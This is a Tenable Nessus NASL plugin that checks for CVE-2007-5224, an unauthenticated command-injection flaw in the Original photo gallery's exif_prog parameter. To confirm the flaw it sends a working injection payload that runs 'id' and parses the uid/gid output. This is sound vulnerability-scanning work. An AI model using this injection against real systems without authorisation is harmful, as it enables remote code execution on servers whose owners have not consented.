#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(26199);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2007-5224");
  script_bugtraq_id(25896);
  script_xref(name:"OSVDB", value:"41390");

  script_name(english:"Original inc/exif.inc.php exif_prog Parameter Arbitrary Command Execution");
  script_summary(english:"Tries to run a command via Original's exif.inc.php");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"Original photo gallery, a PHP-based photo gallery, is installed on the
remote host. 

The version of Original photo gallery on the remote host fails to
sanitize input to the 'exif_prog' parameter of the 'inc/exif.inc.php'
script before using it in an 'exec()' statement to execute a command. 
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker can leverage this issue to execute arbitrary
code on the remote host subject to the privileges of the web server
user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/481316/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Original photo gallery 0.11.3 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/gallery", "/photos", "/original", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to run a command.
  cmd = "id";
  exploit = string("(echo -n '", SCRIPT_NAME, ": ';", cmd, ")||echo");

  req = http_get(
    item:string(
      dir, "/inc/exif.inc.php?",
      "exif_prog=", urlencode(str:exploit)
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
  if (line && ">uid" >< line && " |<a href" >< line)
  {
    line = strstr(line, ">uid") - ">";
    line = line - strstr(line, " |<a href");
    report = string(
      "\n",
      "It was possible to execute the command '", cmd, "' on the remote host,\n",
      "which produces the following output :\n",
      "\n",
      "  ", line
    );
    security_warning(port:port, extra:report);
    exit(0);
  }
}
